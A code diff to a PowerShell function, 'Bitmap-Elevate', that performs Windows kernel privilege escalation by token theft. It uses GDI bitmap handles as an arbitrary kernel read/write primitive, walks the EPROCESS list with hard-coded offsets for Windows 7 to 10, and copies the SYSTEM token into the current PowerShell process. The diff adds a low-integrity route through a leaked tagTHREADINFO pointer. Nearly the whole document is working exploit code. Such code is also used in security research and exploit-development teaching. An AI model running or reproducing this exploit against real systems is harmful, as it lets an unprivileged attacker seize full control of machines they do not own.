@@ -1,5 +1,40 @@
 function Bitmap-Elevate {
-	param([IntPtr]$ManagerBitmap,[IntPtr]$WorkerBitmap)
+<#
+.SYNOPSIS
+	A token stealing wrapper for x32/64 which ingests a handle to a manager and worker bitmap.
+
+	Note that this function has two methods, if supplied with a pointer to an arbitrary tagTHREADINFO object it can elevate the current process from low integrity. Without the tagTHREADINFO pointer it relies on NtQuerySystemInformation (Get-LoadedModules) to leak the base address of the ntkernel which requires medium integrity on Win8.1+.
+
+.DESCRIPTION
+	Author: Ruben Boonen (@FuzzySec)
+	License: BSD 3-Clause
+	Required Dependencies: None
+	Optional Dependencies: None
+
+.PARAMETER ManagerBitmap
+	Handle to manager bitmap.
+
+.PARAMETER WorkerBitmap
+	Handle to worker bitmap.
+
+.PARAMETER ThreadInfo
+	Optional pointer to tagTHREADINFO (Int64/Int32).
+
+.EXAMPLE
+	# MedIL token theft
+	C:\PS> Bitmap-Elevate -ManagerBitmap $ManagerBitmap.BitmapHandle -WorkerBitmap $WorkerBitmap.BitmapHandle
+
+	# LowIL token theft
+	C:\PS> Bitmap-Elevate -ManagerBitmap $ManagerBitmap.BitmapHandle -WorkerBitmap $WorkerBitmap.BitmapHandle -ThreadInfo $ManagerBitmap.tagTHREADINFO
+#>
+	param(
+		[Parameter(Mandatory = $True)]
+		[IntPtr]$ManagerBitmap,
+		[Parameter(Mandatory = $True)]
+		[IntPtr]$WorkerBitmap,
+		[Parameter(Mandatory = $False)]
+		$ThreadInfo
+	)
 
 	Add-Type -TypeDefinition @"
 	using System;
@@ -67,6 +102,28 @@ function Bitmap-Elevate {
 		$CallResult = [BitmapElevate]::SetBitmapBits($ManagerBitmap, [System.IntPtr]::Size, [System.BitConverter]::GetBytes($Address))
 		$CallResult = [BitmapElevate]::SetBitmapBits($WorkerBitmap, [System.IntPtr]::Size, [System.BitConverter]::GetBytes($Value))
 	}
+
+	# Parse EPROCESS list
+	function Traverse-EPROCESS {
+		param($EPROCESS,$TargetPID)
+		echo "[+] Traversing ActiveProcessLinks list"
+		$NextProcess = $(Bitmap-Read -Address $($EPROCESS+$ActiveProcessLinks)) - $UniqueProcessIdOffset - [System.IntPtr]::Size
+		while($true) {
+			$NextPID = Bitmap-Read -Address $($NextProcess+$UniqueProcessIdOffset)
+			if ($NextPID -eq $TargetPID) {
+				echo "[+] PID: $NextPID"
+				echo "[+] Token Address: 0x$("{0:X}" -f $($NextProcess+$TokenOffset))"
+				echo "[+] Token Value: 0x$("{0:X}" -f $(Bitmap-Read -Address $($NextProcess+$TokenOffset)))"
+				$HashTable = @{
+					TokenAddress = $NextProcess+$TokenOffset
+					TokenValue = Bitmap-Read -Address $($NextProcess+$TokenOffset)
+				}
+				$Script:TokenObject = New-Object PSObject -Property $HashTable
+				break
+			}
+			$NextProcess = $(Bitmap-Read -Address $($NextProcess+$ActiveProcessLinks)) - $UniqueProcessIdOffset - [System.IntPtr]::Size
+		}
+	}
 	
 	$OSVersion = [Version](Get-WmiObject Win32_OperatingSystem).Version
 	$OSMajorMinor = "$($OSVersion.Major).$($OSVersion.Minor)"
@@ -76,20 +133,24 @@ function Bitmap-Elevate {
 		{
 			if(!$x32Architecture){
 				if($OSVersion.Build -lt 15063){
+					$KthreadEprocess = 0x220
 					$UniqueProcessIdOffset = 0x2e8
 					$TokenOffset = 0x358          
 					$ActiveProcessLinks = 0x2f0
 				} else {
+					$KthreadEprocess = 0x220
 					$UniqueProcessIdOffset = 0x2e0
 					$TokenOffset = 0x358          
 					$ActiveProcessLinks = 0x2e8
 				}
 			} else {
 				if($OSVersion.Build -lt 15063){
+					$KthreadEprocess = 0x150
 					$UniqueProcessIdOffset = 0xb4
 					$TokenOffset = 0xf4          
 					$ActiveProcessLinks = 0xb8
 				} else {
+					$KthreadEprocess = 0x150
 					$UniqueProcessIdOffset = 0xb4
 					$TokenOffset = 0xfc          
 					$ActiveProcessLinks = 0xb8
@@ -100,10 +161,12 @@ function Bitmap-Elevate {
 		'6.3' # Win8.1 / 2k12R2
 		{
 			if(!$x32Architecture){
+				$KthreadEprocess = 0x220
 				$UniqueProcessIdOffset = 0x2e0
 				$TokenOffset = 0x348          
 				$ActiveProcessLinks = 0x2e8
 			} else {
+				$KthreadEprocess = 0x150
 				$UniqueProcessIdOffset = 0xb4
 				$TokenOffset = 0xec          
 				$ActiveProcessLinks = 0xb8
@@ -113,10 +176,12 @@ function Bitmap-Elevate {
 		'6.2' # Win8 / 2k12
 		{
 			if(!$x32Architecture){
+				$KthreadEprocess = 0x220
 				$UniqueProcessIdOffset = 0x2e0
 				$TokenOffset = 0x348          
 				$ActiveProcessLinks = 0x2e8
 			} else {
+				$KthreadEprocess = 0x150
 				$UniqueProcessIdOffset = 0xb4
 				$TokenOffset = 0xec          
 				$ActiveProcessLinks = 0xb8
@@ -126,50 +191,48 @@ function Bitmap-Elevate {
 		'6.1' # Win7 / 2k8R2
 		{
 			if(!$x32Architecture){
+				$KthreadEprocess = 0x210
 				$UniqueProcessIdOffset = 0x180
 				$TokenOffset = 0x208          
 				$ActiveProcessLinks = 0x188
 			} else {
+				$KthreadEprocess = 0x150
 				$UniqueProcessIdOffset = 0xb4
 				$TokenOffset = 0xf8          
 				$ActiveProcessLinks = 0xb8
 			}
 		}
 	}
-	
-	# Get EPROCESS entry for System process
-	echo "`n[>] Leaking SYSTEM _EPROCESS.."
-	$SystemModuleArray = Get-LoadedModules
-	$KernelBase = $SystemModuleArray[0].ImageBase
-	$KernelType = ($SystemModuleArray[0].ImageName -split "\\")[-1]
-	$KernelHanle = [BitmapElevate]::LoadLibrary("$KernelType")
-	$PsInitialSystemProcess = [BitmapElevate]::GetProcAddress($KernelHanle, "PsInitialSystemProcess")
-	$SysEprocessPtr = if (!$x32Architecture) {$PsInitialSystemProcess.ToInt64() - $KernelHanle + $KernelBase} else {$PsInitialSystemProcess.ToInt32() - $KernelHanle + $KernelBase}
-	$CallResult = [BitmapElevate]::FreeLibrary($KernelHanle)
-	echo "[+] _EPROCESS list entry: 0x$("{0:X}" -f $SysEprocessPtr)"
-	$SysEPROCESS = Bitmap-Read -Address $SysEprocessPtr
-	echo "[+] SYSTEM _EPROCESS address: 0x$("{0:X}" -f $(Bitmap-Read -Address $SysEprocessPtr))"
-	echo "[+] PID: $(Bitmap-Read -Address $($SysEPROCESS+$UniqueProcessIdOffset))"
-	echo "[+] SYSTEM Token: 0x$("{0:X}" -f $(Bitmap-Read -Address $($SysEPROCESS+$TokenOffset)))"
-	$SysToken = Bitmap-Read -Address $($SysEPROCESS+$TokenOffset)
-	
-	# Get EPROCESS entry for current process
-	echo "`n[>] Leaking current _EPROCESS.."
-	echo "[+] Traversing ActiveProcessLinks list"
-	$NextProcess = $(Bitmap-Read -Address $($SysEPROCESS+$ActiveProcessLinks)) - $UniqueProcessIdOffset - [System.IntPtr]::Size
-	while($true) {
-		$NextPID = Bitmap-Read -Address $($NextProcess+$UniqueProcessIdOffset)
-		if ($NextPID -eq $PID) {
-			echo "[+] PowerShell _EPROCESS address: 0x$("{0:X}" -f $NextProcess)"
-			echo "[+] PID: $NextPID"
-			echo "[+] PowerShell Token: 0x$("{0:X}" -f $(Bitmap-Read -Address $($NextProcess+$TokenOffset)))"
-			$PoShTokenAddr = $NextProcess+$TokenOffset
-			break
-		}
-		$NextProcess = $(Bitmap-Read -Address $($NextProcess+$ActiveProcessLinks)) - $UniqueProcessIdOffset - [System.IntPtr]::Size
+
+	if ($ThreadInfo) {
+		echo "`n[>] LowIL compatible leak!"
+		echo "[+] tagTHREADINFO 0x$("{0:X}" -f $ThreadInfo)"
+		$Kthread = Bitmap-Read -Address $ThreadInfo
+		echo "[+] KTHREAD: 0x$("{0:X}" -f $Kthread)"
+		$Eprocess = Bitmap-Read -Address $($Kthread+$KthreadEprocess)
+		echo "[+] PowerShell _EPROCESS: 0x$("{0:X}" -f $Eprocess)"
+		$PoShTokenAddr = $Eprocess+$TokenOffset
+		echo "`n[>] Leaking SYSTEM _EPROCESS.."
+		Traverse-EPROCESS -EPROCESS $Eprocess -TargetPID 4
+		echo "`n[!] Duplicating SYSTEM token!`n"
+		Bitmap-Write -Address $PoShTokenAddr -Value $TokenObject.TokenValue
+	} else {
+		echo "`n[>] MediumIL compatible leak!"
+		$SystemModuleArray = Get-LoadedModules
+		$KernelBase = $SystemModuleArray[0].ImageBase
+		echo "[+] Kernel base: 0x$("{0:X}" -f $KernelBase)"
+		$KernelType = ($SystemModuleArray[0].ImageName -split "\\")[-1]
+		$KernelHanle = [BitmapElevate]::LoadLibrary("$KernelType")
+		$PsInitialSystemProcess = [BitmapElevate]::GetProcAddress($KernelHanle, "PsInitialSystemProcess")
+		$SysEprocessPtr = if (!$x32Architecture) {$PsInitialSystemProcess.ToInt64() - $KernelHanle + $KernelBase} else {$PsInitialSystemProcess.ToInt32() - $KernelHanle + $KernelBase}
+		echo "[+] PsInitialSystemProcess: 0x$("{0:X}" -f $SysEprocessPtr)"
+		$CallResult = [BitmapElevate]::FreeLibrary($KernelHanle)
+		$Eprocess = Bitmap-Read -Address $SysEprocessPtr
+		echo "[+] SYSTEM _EPROCESS: 0x$("{0:X}" -f $(Bitmap-Read -Address $SysEprocessPtr))"
+		$SysToken = Bitmap-Read -Address $($Eprocess+$TokenOffset)
+		echo "`n[>] Leaking PowerShell _EPROCESS.."
+		Traverse-EPROCESS -EPROCESS $Eprocess -TargetPID $PID
+		echo "`n[!] Duplicating SYSTEM token!`n"
+		Bitmap-Write -Address $TokenObject.TokenAddress -Value $SysToken
 	}
-	
-	# Duplicate token!
-	echo "`n[!] Duplicating SYSTEM token!`n"
-	Bitmap-Write -Address $PoShTokenAddr -Value $SysToken
 }
